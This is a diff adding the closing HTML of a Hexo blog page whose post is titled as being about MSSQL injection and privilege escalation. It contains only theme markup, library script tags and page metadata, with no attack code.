+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "MSSQL注入getshell与提权",
+          url: "http://example.com/2026/06/13/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83/",
+          excerpt: "",
+          description: "",
+          stripContent: " MSSQL注入 库介绍： 1234567master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。tempdb   //它为临时表和其他临时工作提供了一个存储区。 其中最主要的是master数",
+          date: "Sat Jun 13 2026 20:06:47 GMT+0800",
+          updated: "Mon Sep 21 2026 21:27:03 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
